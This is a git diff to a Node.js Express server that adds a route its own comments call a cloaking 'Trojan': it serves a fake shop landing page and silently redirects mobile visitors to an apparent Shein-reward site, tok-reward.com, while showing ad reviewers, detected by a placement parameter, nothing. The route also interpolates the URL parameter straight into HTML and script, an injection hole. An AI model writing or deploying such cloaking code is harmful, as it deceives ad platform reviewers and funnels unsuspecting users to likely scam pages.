@@ -8,6 +8,42 @@ const xlsx = require('xlsx');
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Middleware to cloak TRAPI Beta Traffic
+app.get('/trapi/:s1', (req, res, next) => {
+    const { s1 } = req.params;
+    const { ttclid } = req.query;
+    const destination = `https://tok-reward.com/api/shein/v1/entry?s1=${s1}&ttclid=${ttclid}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const ttclid = urlParams.get("ttclid");
+                const s1 = "${s1}";
+                const destination = \`https://tok-reward.com/api/shein/v1/entry?s1=\${s1}&ttclid=\${ttclid}\`;
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = destination;
+                    } else {
+                    }
+            </script>
+            <title>${s1}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${s1} Shop!</h1>
+            <p>You are shopping at: ${s1}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served TRAPI Trojan (${s1})`);
+});
+
 // Middleware to pass on Tyler's SubIDs MY LANDER
 app.get('/twshein/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
